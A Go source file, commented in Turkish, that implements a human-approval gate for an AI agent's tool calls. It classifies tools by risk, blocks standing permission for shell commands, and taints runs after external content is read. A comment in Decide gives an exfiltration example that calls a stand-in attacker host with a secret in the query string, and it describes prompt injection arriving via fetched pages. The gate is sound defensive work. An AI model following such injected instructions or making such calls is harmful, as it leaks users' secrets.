// Package policy — onay kapısının karar mantığı (PRD K17, §5.1).
// Bu paket SAFTIR: DB okumaz, saat dışında yan etki üretmez — karar
// tablolarla test edilir. DB okumaları (kural, kota) orkestratörde yapılıp
// buraya girdi olarak verilir.
package policy

import (
	"fmt"
	"strings"
	"time"
)

// Class — aracın risk sınıfı.
type Class string

const (
	// ClassRead — yerel/uzak okuma; yan etkisiz.
	ClassRead Class = "read"
	// ClassWrite — yerel dosya yazımı (bot çalışma alanı).
	ClassWrite Class = "write"
	// ClassExternal — dışa dönük yan etki (mesaj/e-posta gönder, kayıt aç…).
	ClassExternal Class = "external"
	// ClassExecute — keyfi kod/komut (Bash). Yüksek risk: kural yazılamaz.
	ClassExecute Class = "execute"
	// ClassInternal — motorun iç araçları (plan, todo…); zararsız.
	ClassInternal Class = "internal"
)

type Classification struct {
	Class Class
	// DataSource — araç dış içerik okur: koşuyu tainted yapar (§5.1).
	DataSource bool
	// Ruleable — "hep izin ver / hep reddet" kuralı yazılabilir mi.
	// Execute sınıfı asla; satın alma/kalıcı silme geldiğinde onlar da asla (K17).
	Ruleable bool
	// Sandboxed — iş MOTORUN KENDİ KUTUSUNDA kalır (kap içi çalışma alanı),
	// kullanıcının makinesine ya da dışarıya uzanmaz.
	//
	// Ayrım kapının can alıcı noktası: motorun kendi kabındaki bir dosyayı
	// okumak ile kullanıcının Mac'indeki bir dosyayı okumak aynı şey değil.
	// İkisi de "read" sınıfı ama yalnız birincisi sorulmadan akabilir.
	Sandboxed bool
}

// ClassifyWith — önce açık bildirimlere bakar (MCP gateway kendi araçlarının
// sınıfını bildirir, Faz 4), yoksa Classify sezgiseline düşer. Saf kalır:
// overrides haritasını çağıran taşır (orkestratör).
func ClassifyWith(overrides map[string]Classification, tool string) Classification {
	if c, ok := overrides[tool]; ok {
		return c
	}
	return Classify(tool)
}

// motorAracları — motorun YERLEŞİK araçlarının sınıfları.
//
// Adlar KÜÇÜK HARFE indirgenerek aranır. Sebebi acı bir deneyim: liste
// başta yalnız Claude Code'un adlarını (Read, Bash, Grep) tanıyordu ve tek
// motora pi'ye geçilince sessizce kaydı — pi'nin adları küçük harf, hiçbiri
// eşleşmiyordu ve hepsi "bilinmeyen" kovasına düşüyordu. İki sonucu vardı:
// her zararsız okuma onay kapısına takılıyor, DAHA KÖTÜSÜ `bash` kurala
// bağlanabilir (Ruleable) hâle geliyordu — oysa keyfi komut çalıştırma
// bilinçli olarak asla "hep izin ver" edilemez (K17). Motor değiştiğinde
// politikanın sessizce gevşemesi kabul edilemez; bu yüzden eşleşme motor
// adlandırma zevkinden bağımsız.
var motorAraclari = map[string]Classification{
	// okuma — pi: read/grep/find/ls, Claude Code: Read/Glob/Grep/NotebookRead
	"read": {Class: ClassRead, Ruleable: true, Sandboxed: true},
	"grep": {Class: ClassRead, Ruleable: true, Sandboxed: true},
	"find": {Class: ClassRead, Ruleable: true, Sandboxed: true},
	"ls":   {Class: ClassRead, Ruleable: true, Sandboxed: true},
	"glob": {Class: ClassRead, Ruleable: true, Sandboxed: true},
	"list": {Class: ClassRead, Ruleable: true, Sandboxed: true},

	"notebookread": {Class: ClassRead, Ruleable: true, Sandboxed: true},

	// dış içerik okur: kutunun içinde koşar ama koşuyu tainted yapar (§5.1)
	"webfetch":  {Class: ClassRead, DataSource: true, Ruleable: true, Sandboxed: true},
	"websearch": {Class: ClassRead, DataSource: true, Ruleable: true, Sandboxed: true},

	// yazma — motorun kendi çalışma alanına; yine de yan etki, sorulur
	"write":        {Class: ClassWrite, Ruleable: true, Sandboxed: true},
	"edit":         {Class: ClassWrite, Ruleable: true, Sandboxed: true},
	"multiedit":    {Class: ClassWrite, Ruleable: true, Sandboxed: true},
	"notebookedit": {Class: ClassWrite, Ruleable: true, Sandboxed: true},

	// keyfi komut — EN YÜKSEK risk, kural YAZILAMAZ
	"bash":        {Class: ClassExecute, Ruleable: false},
	"shell":       {Class: ClassExecute, Ruleable: false},
	"terminal":    {Class: ClassExecute, Ruleable: false},
	"run_command": {Class: ClassExecute, Ruleable: false},
	"bashoutput":  {Class: ClassExecute, Ruleable: false},
	"killshell":   {Class: ClassExecute, Ruleable: false},

	// motorun iç defteri; dışarıyla ilgisi yok
	"todowrite":    {Class: ClassInternal, Ruleable: true, Sandboxed: true},
	"task":         {Class: ClassInternal, Ruleable: true, Sandboxed: true},
	"exitplanmode": {Class: ClassInternal, Ruleable: true, Sandboxed: true},
}

// Classify, araç adını risk sınıfına çevirir. MCP araçları için sezgisel;
// gateway araçları sınıfını ClassifyWith üzerinden açıkça bildirir, bu
// sezgisel yalnız bilinmeyenler için kalır. Bilinmeyen araç güvenli tarafa
// ClassExternal sayılır (sorulmadan çalışmaz).
//
// ÖNEKSİZ ad = motorun yerleşik aracı. MCP araçları her zaman `mcp__` taşır,
// yani öneksiz bir ad motorun kendi kutusunun dışına çıkamaz; Sandboxed
// ayrımı buradan gelir.
func Classify(tool string) Classification {
	if !strings.HasPrefix(tool, "mcp__") {
		if c, ok := motorAraclari[strings.ToLower(tool)]; ok {
			return c
		}
		return Classification{Class: ClassExternal, Ruleable: true}
	}

	name := tool[strings.LastIndex(tool, "__")+2:]
	lower := strings.ToLower(name)
	for _, p := range []string{"get", "read", "search", "list", "fetch", "query", "describe"} {
		if strings.HasPrefix(lower, p) {
			// Sandboxed DEĞİL: bir MCP aracı kullanıcının Mac'ine ya da
			// dışarıdaki bir servise uzanır. Okuma bile olsa insana sorulur.
			return Classification{Class: ClassRead, DataSource: true, Ruleable: true}
		}
	}
	return Classification{Class: ClassExternal, Ruleable: true}
}

// Settings — kullanıcı politikası (Ayarlar > Botlar; system_info 'policy').
type Settings struct {
	// DailyActionQuota — bot başına günlük yan-etkili eylem sınırı; 0 = sınırsız.
	// Aşımda otomatik izin durur, her eylem insana sorulur (K17).
	DailyActionQuota int `json:"daily_action_quota"`
	// QuietHoursStart/End — "22:00" biçiminde; boş = kapalı. Sessiz saatlerde
	// dış yan etkiler otomatik akmaz, onaya düşer ("çalışma saatleri dışında
	// beklet" — tasarım, Ayarlar > Botlar).
	QuietHoursStart string `json:"quiet_hours_start"`
	QuietHoursEnd   string `json:"quiet_hours_end"`
	// Timezone — IANA adı; sessiz saat ve kota günü bu dilimde değerlendirilir.
	Timezone string `json:"timezone"`
	// ApprovalTTLHours — park edilmiş onay bu süre cevapsız kalırsa 'expired'.
	// 0 = süresiz bekler.
	ApprovalTTLHours int `json:"approval_ttl_hours"`
}

func DefaultSettings() Settings {
	return Settings{Timezone: "Europe/Istanbul", ApprovalTTLHours: 72}
}

func (s Settings) Validate() error {
	if s.DailyActionQuota < 0 {
		return fmt.Errorf("daily_action_quota negatif olamaz")
	}
	if s.ApprovalTTLHours < 0 {
		return fmt.Errorf("approval_ttl_hours negatif olamaz")
	}
	if (s.QuietHoursStart == "") != (s.QuietHoursEnd == "") {
		return fmt.Errorf("sessiz saatlerin başı ve sonu birlikte verilmeli")
	}
	if s.QuietHoursStart != "" {
		if _, err := parseClock(s.QuietHoursStart); err != nil {
			return err
		}
		if _, err := parseClock(s.QuietHoursEnd); err != nil {
			return err
		}
	}
	if s.Timezone != "" {
		if _, err := time.LoadLocation(s.Timezone); err != nil {
			return fmt.Errorf("timezone geçersiz: %q", s.Timezone)
		}
	}
	return nil
}

func (s Settings) Location() *time.Location {
	if s.Timezone == "" {
		return time.UTC
	}
	loc, err := time.LoadLocation(s.Timezone)
	if err != nil {
		return time.UTC
	}
	return loc
}

// InQuietHours — now, sessiz aralıkta mı? Gece yarısını aşan aralıklar
// (22:00→07:00) desteklenir.
func (s Settings) InQuietHours(now time.Time) bool {
	if s.QuietHoursStart == "" || s.QuietHoursEnd == "" {
		return false
	}
	start, err1 := parseClock(s.QuietHoursStart)
	end, err2 := parseClock(s.QuietHoursEnd)
	if err1 != nil || err2 != nil {
		return false
	}
	local := now.In(s.Location())
	cur := local.Hour()*60 + local.Minute()
	if start == end {
		return false
	}
	if start < end {
		return cur >= start && cur < end
	}
	return cur >= start || cur < end // gece yarısını aşan aralık
}

// DayStart — kota gününün başlangıcı (politika dilimindeki yerel gece yarısı).
func (s Settings) DayStart(now time.Time) time.Time {
	local := now.In(s.Location())
	y, m, d := local.Date()
	return time.Date(y, m, d, 0, 0, 0, 0, s.Location())
}

func parseClock(v string) (int, error) {
	t, err := time.Parse("15:04", v)
	if err != nil {
		return 0, fmt.Errorf("saat %q geçersiz (SS:DD bekleniyor)", v)
	}
	return t.Hour()*60 + t.Minute(), nil
}

// ── karar ──────────────────────────────────────────────────────────────

type DecisionKind int

const (
	// Ask — insana sor (kısa-bekleme + park akışı).
	Ask DecisionKind = iota
	// AutoAllow — kural izin verdi, sorulmaz; eylem loglanır.
	AutoAllow
	// AutoDeny — kural reddetti, sorulmaz.
	AutoDeny
)

type Rule struct {
	Action string // allow | deny
}

type Decision struct {
	Kind DecisionKind
	// Reason — karar gerekçesi (olay kaydına ve onay kartına düşer).
	Reason string
	// AllowAlwaysRule — bu istek onaylanırsa "hep izin ver" kuralına
	// dönüştürülebilir mi (K17 vetoları burada da geçerli).
	AllowAlwaysRule bool
}

// Decide — onay kapısının çekirdeği. Veto sırası (K17):
// deny kuralı → kutu içi okuma → yüksek risk → tainted → kota → sessiz saat →
// allow kuralı → sor.
func Decide(cls Classification, tainted bool, quotaUsed int64, now time.Time, s Settings, rule *Rule) Decision {
	sideEffect := cls.Class == ClassWrite || cls.Class == ClassExternal || cls.Class == ClassExecute

	// Deny kuralı her şeyden önce gelir — tainted deny'ı GÜÇLENDİRİR, zayıflatmaz.
	if rule != nil && rule.Action == "deny" {
		return Decision{Kind: AutoDeny, Reason: "kural: hep reddet"}
	}

	// Yan etkisiz VE motorun kendi kutusunda kalan iş: sorulmaz.
	//
	// Okumak ajanın nefes alması: her `read`/`grep` için insana sormak
	// ürünü kullanılmaz yapıyordu (bot tek bir dosyaya bakmak için bile
	// kapıda bekliyordu). Kuşatma zaten kabın kendisi — pi kullanıcının
	// makinesinde değil, sunucudaki kapta ve botun kendi çalışma alanında
	// koşuyor.
	//
	// SINIR NET: yalnız Sandboxed. Kullanıcının Mac'indeki bir dosyayı okuyan
	// mcp__mac__read_file de "read" sınıfıdır ama kutunun dışına uzanır —
	// o kapıda beklemeye devam eder. Dış içerik okuyan araç (DataSource)
	// sorulmadan akar ama koşuyu TAINTED yapar, yani ondan sonraki her yan
	// etki insana sorulur (§5.1); zincir böyle kapanıyor.
	//
	// TEK İSTİSNA: koşu tainted olduktan sonra DIŞARIYA uzanan okuma da
	// serbest değil. Sebep, "okuma zararsızdır" varsayımının tam olarak
	// burada çökmesi: `fetch_url https://saldirgan/?d=<sır>` bir GET'tir,
	// yani bu tabloya göre "okuma"dır, ama sorgu dizesi gayet iyi bir
	// sızdırma kanalıdır. Kötü niyetli talimat da zaten okunan sayfadan
	// gelir — yani taint tam da bu riskin işaretidir. Kutu İÇİ okuma
	// (read/grep; DataSource değil) tainted koşuda da serbest kalır.
	if !sideEffect && cls.Sandboxed {
		if tainted && cls.DataSource {
			return Decision{
				Kind: Ask, AllowAlwaysRule: false,
				Reason: "koşu tainted — dışarıya giden okuma da sorulur (§5.1)",
			}
		}
		return Decision{Kind: AutoAllow, Reason: "yan etkisiz, motorun kendi kutusunda"}
	}

	if cls.Class == ClassExecute {
		return Decision{Kind: Ask, Reason: "yüksek risk sınıfı — otomatik izin yok (K17)", AllowAlwaysRule: false}
	}
	if tainted && sideEffect {
		// §5.1: dış içerik okuyan koşuda otomatik izinler geçersiz.
		return Decision{Kind: Ask, Reason: "koşu tainted — dış içerik okundu, otomatik izin geçersiz", AllowAlwaysRule: false}
	}
	if sideEffect && s.DailyActionQuota > 0 && quotaUsed >= int64(s.DailyActionQuota) {
		return Decision{Kind: Ask, Reason: fmt.Sprintf("günlük eylem kotası doldu (%d)", s.DailyActionQuota), AllowAlwaysRule: false}
	}
	if cls.Class == ClassExternal && s.InQuietHours(now) {
		return Decision{Kind: Ask, Reason: "sessiz saatler — dış eylemler sabaha onaya düşer", AllowAlwaysRule: false}
	}
	if rule != nil && rule.Action == "allow" && cls.Ruleable {
		return Decision{Kind: AutoAllow, Reason: "kural: hep izin ver"}
	}
	return Decision{Kind: Ask, Reason: "kural yok — insana soruluyor", AllowAlwaysRule: cls.Ruleable}
}
